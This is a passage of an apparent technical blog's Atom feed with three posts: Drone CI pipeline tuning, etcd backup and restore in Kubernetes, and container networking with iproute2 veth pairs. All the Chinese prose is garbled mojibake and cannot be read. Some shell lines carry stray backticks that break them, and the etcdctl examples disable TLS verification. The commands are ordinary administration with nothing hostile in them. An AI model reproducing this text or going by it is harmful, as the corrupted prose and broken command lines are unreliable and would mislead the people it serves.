    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å—æœ‹å‹å§”è¨—ï¼Œå”åŠ©æ”¹å–„äº†ä¸€å€‹ç¾æœ‰çš„ CI/CD Pipeline æµç¨‹ã€‚å°æ–¹çš„å°ˆæ¡ˆä¸»è¦æ˜¯ä¸€ç¾¤ç†Ÿæ‚‰è»Ÿé«”çš„è¨­è¨ˆçš„é–‹ç™¼è€…æ‰€é–‹ç™¼ï¼Œä½†åœ˜éšŠä¸­ä¸¦æ²’æœ‰äººå°æ–¼ç¶­è­· Pipeline æœ‰ç›¸é—œç¶“é©—ï¼Œæ–¼æ˜¯æˆ‘æ¥ä¸‹ä»»å‹™ï¼Œä¸€æ–¹é¢ä¹Ÿæƒ³çœ‹ä¸€ä¸‹åœ¨èª¿æ•™å‰èˆ‡èª¿æ•™ä¹‹å¾Œå¯ä»¥å¾—åˆ°å¤šå¤§çš„æ•ˆç›Šæå‡ã€‚å°æ–¼ä¸€å€‹æ²’æœ‰é–‹ç™¼è©²å°ˆæ¡ˆçš„äººä¾†èªªï¼Œæœ€å¿«äº†è§£å°ˆæ¡ˆæ•´é«”çš„æ•´åˆèˆ‡éƒ¨ç½²æµç¨‹çš„æ–¹å¼å°±æ˜¯ç›´æ¥å»çœ‹ç¾æœ‰çš„ Pipelineã€‚æ–¼æ˜¯æˆ‘æ‰“ç®—å¾æª¢è¦– Pipeline é–‹å§‹ä¸‹æ‰‹ï¼Œçœ‹æœ‰å“ªäº›åœ°æ–¹å¯ä»¥æ”¹è‰¯ã€‚</p><h2 id="Runner-çš„é¸æ“‡"><a href="#Runner-çš„é¸æ“‡" class="headerlink" title="Runner çš„é¸æ“‡"></a>Runner çš„é¸æ“‡</h2><p>å°æ–¹ç•¶æ™‚ç‚ºäº†å¿«é€Ÿå°‡ Pipeline æ­å»ºä¸Šç·šï¼Œæ‰€ä»¥åœ¨é¸æ“‡ Runner çš„æ™‚å€™é¸æ“‡äº†ä¸€å€‹æœ€å¿«é€Ÿï¼ˆä½†å¯èƒ½ä¸å®‰å…¨ï¼‰çš„ Runnerï¼Œä¹Ÿå°±æ˜¯ Exec Runnerï¼ˆå°æ–¹æ¡ç”¨çš„ CI å·¥å…·ç‚º Drone CI ï¼‰ã€‚ç„¶è€Œå› ç‚ºç§»æ¤æ€§çš„é—œä¿‚ï¼Œæˆ‘å€‘éƒ½æœƒå¸Œæœ›è‡ªå·±çš„ Pipeline ç’°å¢ƒå¯ä»¥è·‘åœ¨å®¹å™¨ä¹‹ä¸­ï¼Œæ–¹ä¾¿å¾ŒçºŒçš„é·ç§»ä»¥åŠä¸è€¦åˆæ–¼ç‰¹å®šä½œæ¥­ç³»çµ±ã€‚æ–¼æ˜¯æˆ‘å°‡å°æ–¹ä¼ºæœå™¨ä¸Šçš„ Runner é‡æ–°æ¶è¨­äº† Docker Runnerï¼Œä¸¦ä¸”å°‡åŸæœ‰çš„ <code>.drone.yml</code> è¨­å®šæª”ç”± Exec Runner å½¢å¼è½‰æ›æˆ Docker Runnerï¼Œçµæœé¦¬ä¸Šé‡åˆ°äº†ç¬¬ä¸€å€‹å•é¡Œ</p><blockquote><p>åŸæœ¬çš„ CI æ•´åˆæ¸¬è©¦çš„æ™‚é–“ç”± 2 åˆ†é˜ç›´æ¥è®Šæˆäº† 8 åˆ†é˜ã€‚</p></blockquote><p>ç¶“éå¾ŒçºŒçš„æ’æŸ¥æ‰ç™¼ç¾åŸä¾†å°æ–¹çš„ Exec Runner åœ¨åŸ·è¡Œ Maven æ‰“åŒ…æ™‚ï¼Œå› ç‚ºæ˜¯ç›´æ¥åœ¨ä½œæ¥­ç³»çµ±ä¸Šé–‹å•Ÿ Process ä¾†è™•ç†ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡åŸ·è¡Œéƒ½æ˜¯ä¸€æ¨£çš„ç’°å¢ƒï¼Œé€ æˆå¾ŒçºŒé€²è¡Œæ‰“åŒ…çš„æ™‚å€™éƒ½æ˜¯å…±ç”¨ <code>/root/.m2/repository</code> è£¡é¢çš„å¥—ä»¶ï¼Œé€ æˆæ¯ä¸€æ¬¡ CI å…¶å¯¦éƒ½åœ¨å¿«å–ä¹‹å‰ç”¨éçš„å¥—ä»¶ï¼Œä¸¦ä¸æ˜¯å®Œå…¨ä¹¾æ·¨çš„ç’°å¢ƒã€‚è‹¥ä½¿ç”¨ Docker Runnerï¼Œä¹Ÿæƒ³è¦é¡ä¼¼çš„å¿«å–è¡Œç‚ºï¼Œå°±åªèƒ½é€éå…±äº«ç‰¹å®š host ä¸Šçš„ç›®éŒ„ä¾†é”æˆï¼Œåœ¨ DroneCI ä¸­æ­¤é¡çš„è¨­å®šä¹Ÿæ˜¯éå¸¸å¥½æ’°å¯«ã€‚</p><h2 id="Docker-in-Docker"><a href="#Docker-in-Docker" class="headerlink" title="Docker in Docker"></a>Docker in Docker</h2><p>æ¥ä¸‹ä¾†é€™å€‹å•é¡Œå¹¾ä¹æ˜¯æ‰€æœ‰ CI/CD å¹³å° çš„ Docker Runner éƒ½æœƒé‡åˆ°çš„å•é¡Œã€‚å¦‚ä½•åœ¨ CI/CD Stage ä¸­ä½¿ç”¨ Docker æŒ‡ä»¤ä¾†å»ºæ§‹ Docker Imageï¼Ÿé€™å€‹å•é¡Œçš„è§£æ³•å¤§è‡´ä¸Šå¯åˆ†ç‚ºå…©ç¨®ï¼ˆDinD èˆ‡ DooDï¼‰ã€‚ç„¶è€Œæœ€å¿«çš„æ–¹æ³•æ˜¯ç›´æ¥å°‡ <code>/var/run/docker.sock</code> æ›è¼‰æ–¼ Stage çš„ Container ä¸­ï¼Œä¾†é”åˆ°å¯ä»¥åœ¨å®¹å™¨ä¹‹ä¸­é€é UNIX Sock èˆ‡ host ä¸Šçš„ Docker Engine æºé€šï¼ˆç•¶ç„¶é‚„è¦æœ‰ docker cliï¼‰ã€‚å¯¦éš›ä¸Šåœ¨åŸ·è¡Œ Pipeline æ™‚ï¼Œç™¼ç¾åœ¨å°æ–¹å°ˆæ¡ˆä¸­çš„ testcontainer åœ¨é€²è¡Œæ•´åˆæ¸¬è©¦æ™‚ï¼Œå˜—è©¦å»é€£ç·šè‡ªå·±ï¼ˆMaven ä¸­çš„ testcontainerï¼‰æ‰€å»ºç«‹å‡ºä¾† testcontainers/ryuk å®¹å™¨ï¼Œä¸¦ä¸”å› ç‚ºç„¡æ³•æ­£å¸¸é€£ç·šè‡³è©²å®¹å™¨è€Œå°è‡´éŒ¯èª¤ã€‚å¾Œä¾†æŸ¥çœ‹äº†ç³»çµ±ç’°å¢ƒæ‰ç™¼ç¾å°æ–¹ Runner çš„æ©Ÿå™¨ä¸Šä½¿ç”¨ ufw å»ç®¡ç†é˜²ç«ç‰†</p><blockquote><p>ufw æœƒå°‡ iptables ä¸­çš„ INPUT chain (filter table) Policy æ”¹æˆ DROP</p></blockquote><p>é€ æˆ Drone CI Stage ä¸­çš„ Container ç„¡æ³•æ­£å¸¸å­˜å–å…¶ä»– Containerï¼Œä¸»è¦å› ç‚º Drone CI å› ç‚ºå®‰å…¨åŸå› æ‰€ä»¥å°‡é€™äº› Stage é–‹å‡ºä¾†çš„ Container éƒ½æ”¾åœ¨ç¨ç«‹çš„ Linux Bridge ä¹‹ä¸‹ï¼Œè€Œä¸æ˜¯é è¨­çš„ docker0ï¼Œé€™æ™‚å€™è·¨ä»‹é¢çš„é€šè¨Šæœƒå› ç‚º iptables è¦å‰‡è€Œè¢«æ“‹ä¸‹ï¼ˆç•¶æ™‚ ufw ç‚ºé–‹å•Ÿç‹€æ…‹ï¼‰ã€‚</p><h2 id="latest-tag-é€ æˆçš„éš±å«è¡Œç‚º"><a href="#latest-tag-é€ æˆçš„éš±å«è¡Œç‚º" class="headerlink" title="latest tag é€ æˆçš„éš±å«è¡Œç‚º"></a>latest tag é€ æˆçš„éš±å«è¡Œç‚º</h2><p>å°‡ Pipeline æ•´ç†å¾—å·®ä¸å¤šæ™‚ï¼Œç™¼ç¾åœ¨ CD éšæ®µæ™‚çš„åŸºç¤è¨­æ–½éƒ½æ˜¯ç”¨ docker-compose åŸ·è¡Œï¼Œå¯æ˜¯é€™äº› Image ä¸¦æ²’æœ‰æŒ‡å®š Image tagï¼ˆé è¨­æ¡ç”¨ latestï¼‰ã€‚æ–¼æ˜¯ä½¿ç”¨äº† docker images æŒ‡ä»¤ç™¼ç¾é€™äº› Image éƒ½æ˜¯åœ¨æ•¸å€‹æœˆä¹‹å‰è¢«æ‹‰åˆ°æœ¬åœ°ç«¯çš„ï¼Œç„¡æ³•å¾—çŸ¥ç•¶æ™‚ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ²’è¾¦æ³•æŒ‡å®šç‰¹å®šç‰ˆæœ¬ä¾†ç¶­æŒå°ˆæ¡ˆçš„ç§»æ¤æ€§ã€‚ä½¿ç”¨ Image çš„ id åœ¨ docker hub ä¸Šé¢æœå°‹å¯èƒ½æ˜¯ä¸€å€‹è¾¦æ³•ï¼Œä½†æ˜¯ docker hub ä¸¦æ²’æœ‰æä¾›è®“ç”¨æˆ¶ç›´æ¥ç”¨ Image id ä¾†æœå°‹çš„æ–¹å¼ã€‚åœ¨ç¶²è·¯ä¸Šæ‰¾äº†ä¸€äº›å·¥å…·ä¹Ÿæ²’æœ‰è§£æ±ºæƒ³çŸ¥é“é€™äº› Image åˆ°åº•æ˜¯å“ªä¸€å€‹ç‰ˆæœ¬çš„å•é¡Œã€‚åœ¨æœ€å¾Œä½¿ç”¨ docker inspect æ™‚ç„¡æ„é–“çœ‹åˆ°</p><blockquote><p>ContainerConfig æ¬„ä½ï¼Œå…¶ä¸­çš„ Env æ¬„ä½ä¸­æœ‰æ‡‰ç”¨ç¨‹å¼çš„ç‰ˆæœ¬è³‡è¨Š</p></blockquote><p>é›–ç„¶æ²’æœ‰è¾¦æ³•å®Œå…¨çŸ¥é“ Image çš„ tagï¼Œä½†æ˜¯çŸ¥é“ Image ä¸­æ‡‰ç”¨ç¨‹å¼çš„ç‰ˆæœ¬ä¹Ÿå¯ä»¥æ–¹ä¾¿ä½¿ç”¨é€™äº›ç‰ˆæœ¬ä¾†é€²è¡Œæ¸¬è©¦ï¼Œæ¸¬è©¦æ²’å•é¡Œå¾Œå°±å°‡é€™äº›ç‰ˆæœ¬éƒ½å›ºå®šï¼Œé¿å…æ—¥å¾Œè½‰ç§»æ™‚å› ç‚º latest æ¨™ç±¤è€Œç„¡æ³•ç¢ºå®šç‰ˆæœ¬ã€‚</p><h2 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h2><p>é€™ç¯‡ç‚ºé€™å¹¾å¤©æœ€ä½³åŒ– Pipeline å¾Œçš„ç´€éŒ„å°ç¸½çµï¼Œåœ¨å°‡é€™äº›åˆæ­¥çš„æœ€ä½³åŒ–å®Œæˆä¹‹å¾Œã€‚ä¹‹å¾Œå‰‡æœƒé€²è¡Œä¸€äº›è¨­è¨ˆæ–¹å‘çš„æœ€ä½³åŒ–ï¼ŒåŒ…å«</p><ul><li>å¦‚ä½•è¦åŠƒå¿«å–æ‰å¯ä»¥åŠ é€Ÿæµç¨‹ä½†ä¸å¸Œæœ›å› æ­¤è€Œé€ æˆæ¸¬è©¦ä¸ä¹¾æ·¨</li><li>å¦‚ä½•è¨­è¨ˆä¸€å€‹å¯ä»¥åœ¨ monorepo çš„å°ˆæ¡ˆä¸­ï¼Œä¸ç”¨å› ç‚ºæ”¹äº† Aï¼Œå°±å°‡å…¨éƒ¨çš„å¾®æœå‹™ï¼ˆA, B, Cï¼‰é‡æ–°æ‰“åŒ…</li><li>ä½¿å¦éœ€è¦ä¸€å€‹å„²å­˜æ•æ„Ÿè³‡è¨Šçš„å€åŸŸï¼Œè®“å¤šå€‹ Runner åœ¨éƒ¨ç½²æ™‚å¯ä»¥å»æ‹‰å–è³‡è¨Šï¼ˆè€Œä¸é€é host å…±äº«æª”æ¡ˆï¼‰</li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CI/CD" scheme="https://blog.yiyu0x.org/tags/CI-CD/"/>
    
      <category term="Docker" scheme="https://blog.yiyu0x.org/tags/Docker/"/>
    
      <category term="DroneCI" scheme="https://blog.yiyu0x.org/tags/DroneCI/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•å‚™ä»½ Kubernetes ä¸­çš„ etcd</title>
    <link href="https://blog.yiyu0x.org/2021/05/21/"/>
    <id>https://blog.yiyu0x.org/2021/05/21/</id>
    <published>2021-05-21T12:29:50.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h2><p>Kubernetes ä¸­çš„ç‹€æ…‹éƒ½æ˜¯ç”¨ etcd é€™å¥— key-value å„²å­˜å·¥å…·ä¾†ç¶­æŒï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘åªè¦å‚™ä»½å¥½ etcd å¾Œï¼Œå°±å¯ä»¥å¾ˆè¼•æ˜“çš„é‡å»ºä¸€å€‹ä¸€æ¨¡ä¸€æ¨£çš„ Cluster èµ·ä¾†ã€‚</p><p>è¦å‚™ä»½ etcd å¯ä»¥ä½¿ç”¨ etcdctl é€™å¥— cli å·¥å…·ä¾†ç°¡å–®å®Œæˆ</p><p>å› ç‚º etcd åˆ†äº† v2, v3 å…©ç¨®ç‰ˆæœ¬ï¼Œå½¼æ­¤ä¸ç›¸å®¹ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨ cli å·¥å…·æ™‚éœ€è¦æŒ‡å®šç‰ˆæœ¬</p><p>åœ¨æ“ä½œæ™‚ï¼Œæˆ‘å€‘æœƒéœ€è¦ cert ä½ç½®èˆ‡ key çš„ä½ç½®ï¼Œå¦‚æœä½ çš„ Cluster æ˜¯é€é kubeadm å®‰è£ï¼Œé‚£éº¼ä½ç½®éƒ½æœƒåœ¨ <code>/etc/kubernetes/pki/etcd</code> ä¸­</p><p>æˆ‘å€‘å¯ä»¥å…ˆé€é <code>etcdctl member list</code> ä¾†ç¢ºèªæ˜¯å¦å¯ä»¥æ­£ç¢ºé€£ç·šåˆ°æˆ‘å€‘çš„ etcd</p><p>ä»¥ä¸‹éƒ½å‡è¨­æˆ‘çš„ etcd ä½ç½®åœ¨ <code>10.10.10.10</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl member list \</span><br><span class="line">--endpoints https://10.10.10.10:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/server.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/server.key \</span><br><span class="line">--insecure-skip-tls-verify</span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœè¦ºå¾—æŒ‡ä»¤å¤ªé•·çš„è©±ï¼Œetcdctl é è¨­æœƒå»åƒç’°å¢ƒè®Šæ•¸ï¼Œä¹Ÿå¯ä»¥åœ¨ç’°å¢ƒè®Šæ•¸ä¸­è¨­å®š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ETCDCTL_CERT_FILE='/etc/kubernetes/pki/etcd/server.crt'</span><br><span class="line">export ETCDCTL_KEY_FILE='/etc/kubernetes/pki/etcd/server.key'</span><br><span class="line">export ETCDCTL_ENDPOINTS='https://10.10.10.10:2379'</span><br></pre></td></tr></tbody></table></figure><p>ä¸ç¢ºå®šé€™äº›è³‡è¨Šåœ¨å“ªè£¡çš„è©±ï¼Œå¯ä»¥ç›´æ¥å»çœ‹ä½  etcd çš„ yaml å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œé€™äº›è³‡è¨Šæœƒåœ¨ etcd çš„å•Ÿå‹•åƒæ•¸ä¸­</p><h2 id="åŒ¯å‡º"><a href="#åŒ¯å‡º" class="headerlink" title="åŒ¯å‡º"></a>åŒ¯å‡º</h2><p>ç¢ºèªå¯ä»¥é€£ç·šä¹‹å¾Œï¼Œæˆ‘å€‘å°‡ etcd çš„å…§å®¹å®Œæ•´çš„åŒ¯å‡ºï¼Œå‘½åç‚º <code>etcd-snapshot-$(date +%Y%m%d).db</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot save /root/etcd-snapshot-$(date +%Y%m%d).db \</span><br><span class="line">--endpoints https://10.10.10.10:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/server.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/server.key \</span><br><span class="line">--insecure-skip-tls-verify</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Snapshot saved at /root/etcd-snapshot-20210521.db</span><br></pre></td></tr></tbody></table></figure><h2 id="åŒ¯å…¥"><a href="#åŒ¯å…¥" class="headerlink" title="åŒ¯å…¥"></a>åŒ¯å…¥</h2><p>åŒ¯å‡ºç›¸è¼ƒåŒ¯å‡ºéº»ç…©ä¸€äº›ï¼Œæˆ‘å€‘éœ€è¦å…ˆè®“ api-server èˆ‡ etcd éƒ½çµ‚æ­¢ï¼Œé‡æ–°å°‡ etcd çš„è³‡æ–™åŒ¯å…¥ä¹‹å¾Œå†é‡æ–°æ‰“é–‹å®ƒå€‘ã€‚</p><p>æˆ‘çš„ api-server èˆ‡ etcd éƒ½æ˜¯ä»¥ static pod çš„æ–¹å¼å­˜åœ¨ï¼Œæ‰€ä»¥åªè¦å°‡å°æ‡‰çš„ yaml æª”æ¡ˆæš«æ™‚ç§»é™¤ static pod ç›®éŒ„å³å¯</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/kubernetes/manifests/etcd.yaml /root/etcd.yaml</span><br><span class="line">mv /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml</span><br></pre></td></tr></tbody></table></figure><p>æ¥è‘—æˆ‘å€‘å°‡èˆŠçš„ etcd è³‡æ–™æš«æ™‚ç§»é–‹ï¼ˆåŒæ™‚é€²è¡Œå‚™ä»½ï¼‰</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/etcd/default.etcd /var/lib/etcd/default.etcd.bak</span><br></pre></td></tr></tbody></table></figure><p>å°‡æ–°çš„å‰›æ‰åŒ¯å‡ºçš„ etcd è³‡æ–™é‡æ–°åŒ¯å…¥</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ETCDCTL_API=3 etcdctl snapshot restore /root/etcd-snapshot-20210521.db \</span><br><span class="line">--name etcd-0 \</span><br><span class="line">--initial-cluster "etcd-0=https://10.10.10.10:2380" \</span><br><span class="line">--initial-cluster-token etcd-cluster \</span><br><span class="line">--initial-advertise-peer-urls https://10.10.10.10:2380 \</span><br><span class="line">--data-dir=/var/lib/etcd/default.etcd</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2021-05-21 07:42:36.826573 I | mvcc: restore compact to 3969180</span><br><span class="line">2021-05-21 07:42:36.840090 I | etcdserver/membership: added member 9ce23f330769428b [https://10.10.10.10:2380] to cluster 457ee8b0c2eda630</span><br></pre></td></tr></tbody></table></figure><p>åŒ¯å‡ºä¹‹å¾Œå†æŠŠ api-server èˆ‡ etcd é‡å•Ÿå°±å¯ä»¥äº†</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /root/etcd.yaml /etc/kubernetes/manifests/etcd.yaml</span><br><span class="line">mv /root/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ iproute2 å®¢è£½åŒ–ä½ çš„ Container ç¶²è·¯</title>
    <link href="https://blog.yiyu0x.org/2021/04/29/"/>
    <id>https://blog.yiyu0x.org/2021/04/29/</id>
    <published>2021-04-29T12:40:21.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘å€‘éƒ½çŸ¥é“ Docker æœ‰æä¾›ä¸åŒçš„ç¶²è·¯æ¨¡å¼ä¾›æˆ‘å€‘ä½¿ç”¨ï¼Œå¾é è¨­çš„ Bridge åˆ°å…±ç”¨æœ¬æ©Ÿ Network Namespace çš„ Hostã€‚æˆ‘å€‘ç”šè‡³å¯ä»¥è‡ªè¨‚è‡ªå·±çš„ Bridge ä¾†åˆ‡å‰²ä¸åŒç¶²æ®µï¼Œå¦‚æ­¤ä¸€ä¾†ä¸€äº›ç¶²è·¯æ‹“å¢£éƒ½æ¶è¨­éƒ½å¯ä»¥ç”¨ Docker ä¾†å®Œæˆã€‚</p><p>å€åˆ¥ä¸åŒç¶²æ®µæˆ‘å€‘é€šå¸¸æœƒä½¿ç”¨ä¸åŒçš„ Bridge ä¾†åˆ†éš”ï¼Œé€šå¸¸æœƒå…ˆå»ºç«‹è‡ªè¨‚çš„ Bridge</p><p><code>docker network create --driver bridge testing-bridge</code></p><p>ä¹‹å¾Œå»ºç«‹ container æ™‚å¯ä»¥æŒ‡å®šè©² bridge ä¾†ä½¿ç”¨è©²ç¶²è·¯ç©ºé–“</p><p><code>docker run -it --net=testing-bridge alpine</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ # ip a</span><br><span class="line">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">35: eth0@if36: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP</span><br><span class="line">    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>é€™æ™‚å€™å¯ä»¥ç™¼ç¾ Docker å¹«æˆ‘å»ºç«‹å¥½äº† <code>172.18.0.2/16</code> ç¶²æ®µçš„ä»‹é¢å¯ä»¥ä½¿ç”¨ï¼Œé€™æ™‚å€™ä½ æœƒç™¼ç¾è©²ä»‹é¢å¯ä»¥ç›´æ¥å‡ºå¾—å»å¤–ç¶²ï¼Œå› ç‚º Docker å»ºç«‹å¥½ Bridgeï¼Œæ‰€ä»¥å°åŒ…æœƒå¾è©² Bridge åˆ°æœ¬æ©Ÿç«¯å‡ºå»ã€‚</p><p>é‚£æˆ‘å€‘å¯ä¸å¯ä»¥ä¸è¦è®“ Container æœ‰æ©Ÿæœƒå¾æœ¬æ©Ÿè®“å°åŒ…æµå‡ºå»å‘¢ï¼Ÿ</p><p>ï¼ˆæœ‰æ™‚å€™è¦å»ºç«‹ç¶²è·¯æ‹“å¢£ï¼Œä¸å¸Œæœ›å°åŒ…èµ°æœ¬æ©Ÿçš„è·¯ç”±å‡ºå»ï¼Œå¸Œæœ›å°åŒ…å¾è©²ç¶²è·¯è·¯ç”±åˆ°å…¶ä»–ç¶²è·¯ï¼Œä¹Ÿå°±æ˜¯å…¶ä»– Containerï¼‰</p><h2 id="è§£æ±ºï¼ˆä½¿ç”¨-veth-peerï¼‰"><a href="#è§£æ±ºï¼ˆä½¿ç”¨-veth-peerï¼‰" class="headerlink" title="è§£æ±ºï¼ˆä½¿ç”¨ veth peerï¼‰"></a>è§£æ±ºï¼ˆä½¿ç”¨ veth peerï¼‰</h2><p>è¦é”æˆé€™ä»¶äº‹ï¼Œæœ€å¿«çš„åšæ³•å°±æ˜¯è‡ªå·±å»ºç«‹ veth ä¸¦ä¸”å°‡ peer å…©ç«¯ç›´æ¥ç¶åœ¨å…©å€‹ Container ä¸Š</p><p>æˆ‘å€‘æ‰“ç®—ç”¨ iproute2 ç›´æ¥ç®¡ç†ç¶²è·¯ï¼Œæ‰€ä»¥å»ºç«‹ containers æ™‚ä½¿ç”¨ <code>--net=none</code></p><p><code>docker run -itd --name=left --net=none alpine</code><br><code>docker run -itd --name=right --net=none alpine</code></p><p>æ¥è‘—éœ€è¦è‡ªè¡Œå»ºç«‹ Containers å€‘çš„ Network Namespace</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left_pid=$(docker inspect -f '{{.State.Pid}}' left)`</span><br><span class="line">right_pid=$(docker inspect -f '{{.State.Pid}}' right)`</span><br><span class="line">sudo mkdir -p /var/run/netns</span><br><span class="line">sudo ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid</span><br><span class="line">sudo ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid</span><br></pre></td></tr></tbody></table></figure><p>æ¥è‘—å»ºç«‹ veth peer ä¸¦ä¸”å‘½åç‚º <code>A</code> ä»¥åŠ <code>B</code></p><p><code>ip link add A type veth peer name B</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link set A netns $left_pid # è¨­å®š peer ç«¯ A åˆ° left container</span><br><span class="line">ip netns exec $left_pid ip link set dev A name eth0 # è¨­å®š namespace ä¸­çš„ä»‹é¢åç¨±</span><br><span class="line">ip netns exec $left_pid ip link set eth0 up # å•Ÿå‹•ä»‹é¢</span><br><span class="line">ip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0 # è¨­å®š IP</span><br><span class="line">#ip netns exec $left_pid ip route add default via 10.113.1.254</span><br></pre></td></tr></tbody></table></figure><p>æ–°å¢é è¨­è·¯ç”±çš„éƒ¨åˆ†è¨»è§£æ‰æ˜¯å› ç‚ºæˆ‘å€‘å°‡ Containers ç”¨ veth peer æ¥èµ·ä¾†ï¼Œæœ¬ä¾†å°±æ˜¯é€šçš„ï¼Œæ‰€ä»¥ä¸éœ€è¦æœ‰é è¨­è·¯ç”±ä¹Ÿå¯ä»¥åˆ°é”å¦å¤–ä¸€å€‹ Containerã€‚å¯ä»¥ä¾ç…§æƒ…æ³å»è¨­å®šä½ çš„é è¨­è·¯ç”±</p><p>æ¥è‘—è¨­å®š Container right</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link set B netns $right_pid</span><br><span class="line">ip netns exec $right_pid ip link set dev B name eth0</span><br><span class="line">ip netns exec $right_pid ip link set eth0 up</span><br><span class="line">ip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0</span><br><span class="line">#ip netns exec $right_pid ip route add default via 10.113.1.254</span><br></pre></td></tr></tbody></table></figure><p>è¨­å®šå®Œä¹‹å¾Œé€²å» Containers ä½ æœƒç™¼ç¾ä»–çš„ç¶²è·¯ä»‹é¢ç‚º</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@docker-env:~$ docker exec -it left sh</span><br><span class="line">/ # ip a</span><br><span class="line">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever 